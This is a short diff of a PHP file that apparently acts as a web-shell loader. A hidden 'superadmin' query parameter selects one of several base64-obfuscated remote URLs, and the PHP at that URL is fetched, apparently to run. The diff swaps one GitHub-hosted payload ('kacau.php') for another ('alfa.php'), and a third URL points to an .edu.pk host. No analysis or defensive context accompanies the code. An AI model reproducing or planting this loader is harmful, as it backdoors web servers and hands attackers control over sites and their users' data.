@@ -23,7 +23,7 @@ function get_data($url) {
 $x = '?>';
 
 if (isset($_GET['superadmin'])) {
-    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZhbWlseUxpemFyZC9wZW5naHVuaWJja2Rvci9yZWZzL2hlYWRzL21haW4va2FjYXUucGhw');
+    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi9hbGZhLnBocA==');
 } else {
     $target_url = base64_decode('aHR0cHM6Ly9zdGFudGhvbnlzZnQuZWR1LnBrL2FwYS5waHA=');
 }
